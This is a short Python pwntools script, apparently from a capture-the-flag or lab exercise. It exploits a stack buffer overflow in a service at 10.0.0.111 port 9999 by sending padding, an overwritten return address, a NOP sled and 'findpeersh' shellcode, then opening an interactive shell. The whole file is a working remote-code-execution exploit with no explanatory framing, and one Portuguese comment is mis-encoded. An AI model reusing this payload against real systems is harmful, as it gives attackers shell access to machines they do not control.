#!/usr/bin/env python3

from pwn import *

context(bits=32, arch='i386')
# Encontrar o offset correto
conn = remote('10.0.0.111', 9999)

shellcode = asm(shellcraft.findpeersh())
#nopsled_address = p32(0xffffd0a0+20)
#nopsled_address = p32(0xffffd0e0)
nopsled_address = p32(0xffffcca0)
payload = b"A"*76
payload += nopsled_address
payload += b"\x90"*32
payload += shellcode

conn.sendline(payload)

# Abrir uma sess√£o interativa
conn.interactive()
